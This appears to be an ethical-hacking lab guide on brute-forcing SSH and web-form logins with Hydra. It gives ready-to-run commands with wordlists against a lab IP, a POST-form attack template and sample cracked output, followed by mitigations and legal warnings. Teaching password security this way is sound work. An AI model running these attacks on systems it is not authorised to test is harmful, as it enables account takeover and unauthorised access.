# Lab 4: Password Cracking with Hydra

## **Objective**
Learn how to use **Hydra**, a brute-force password-cracking tool, to test the strength of login credentials. This lab demonstrates the importance of strong password policies and how attackers exploit weak passwords.

---

## **Prerequisites**
1. **Kali Linux or Any Linux Distro with Hydra Installed**:
   - Check if Hydra is installed:
     ```bash
     hydra -h
     ```
   - Install it if necessary:
     ```bash
     sudo apt update && sudo apt install hydra
     ```

2. **Target System**:
   - Use a controlled environment such as a test web server, SSH service, or FTP server where you have permission to test.
   - **Insight**: Unauthorized use of Hydra is illegal and unethical.

3. **Wordlist**:
   - A list of potential passwords for the attack.
   - **Tip**: Kali Linux includes wordlists, such as `/usr/share/wordlists/rockyou.txt`. Ensure it is extracted first:
     ```bash
     gunzip /usr/share/wordlists/rockyou.txt.gz
     ```

---

## **Step 1: Identify Target Service**
1. Determine the service and protocol you want to test (e.g., HTTP, SSH, FTP).
2. Verify the service is running on the target system.
   - Use Nmap to identify open ports and services:
     ```bash
     nmap -sV <target_ip>
     ```

---

## **Step 2: Preparing Hydra**
Hydra requires the following:
- **Target IP or Hostname**: The system you are testing.
- **Protocol**: The service you are targeting (e.g., ssh, ftp, http).
- **Username**: The account to test or a list of usernames.
- **Password List**: A wordlist containing potential passwords.

### Example Setup:
- Target: `192.168.1.100`
- Protocol: `ssh`
- Username: `admin`
- Password List: `/usr/share/wordlists/rockyou.txt`

---

## **Step 3: Basic Hydra Command**
Run a brute-force attack against the SSH service:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
```
- **`-l admin`**: Specifies a single username (`admin`).
- **`-P /usr/share/wordlists/rockyou.txt`**: Points to the password wordlist.
- **`ssh://192.168.1.100`**: Specifies the target protocol and IP address.

---

## **Step 4: Advanced Hydra Options**
1. **Testing Multiple Usernames**:
   - Use a username list instead of a single username:
     ```bash
     hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
     ```

2. **Limiting Connection Attempts**:
   - Reduce the number of simultaneous connections to avoid crashing the target service:
     ```bash
     hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.100
     ```
   - **`-t 4`**: Limits to 4 parallel tasks (default is 16).

3. **Using HTTP POST Forms**:
   - Target login forms by specifying the POST request structure:
     ```bash
     hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
     "/login:username=^USER^&password=^PASS^:F=Invalid login"
     ```
   - Replace `/login` with the form's action URL and `F=Invalid login` with the failure message.

4. **Saving Results**:
   - Output results to a file for later review:
     ```bash
     hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -o results.txt
     ```

---

## **Step 5: Analyzing Results**
1. Successful credentials will appear in the terminal output or saved file:
   ```
   [22][ssh] host: 192.168.1.100   login: admin   password: password123
   ```
2. Document any findings and compare against the targetâ€™s password policy.

---

## **Step 6: Mitigation Strategies**
1. Enforce strong password policies:
   - Use long, complex passwords.
   - Implement multi-factor authentication (MFA).

2. Limit login attempts:
   - Configure services to block IPs after a set number of failed attempts.

3. Monitor logs:
   - Regularly review login logs for suspicious activity.

4. Use encryption:
   - Ensure services like SSH are configured with strong encryption algorithms.

---

## **Additional Tips and Insights**
1. **Legal Considerations**:
   - Only use Hydra in environments where you have explicit permission to test.
   - **Insight**: Unauthorized testing can lead to legal and ethical violations.

2. **Ethical Hacking**:
   - Use tools like Hydra responsibly to identify and mitigate security risks, not exploit them.

3. **Practice in Controlled Environments**:
   - Set up a lab with vulnerable systems to test and refine your skills safely.

4. **Explore Hydra Modules**:
   - Hydra supports a variety of protocols (e.g., SMB, VNC, Telnet). Experiment to learn their specific options and behaviors.

---

## **Key Takeaways**
1. Hydra is a versatile tool for testing the strength of login credentials.
2. Strong password policies and additional security measures can significantly reduce brute-force attack risks.
3. Ethical use and proper authorization are critical when performing password-cracking activities.
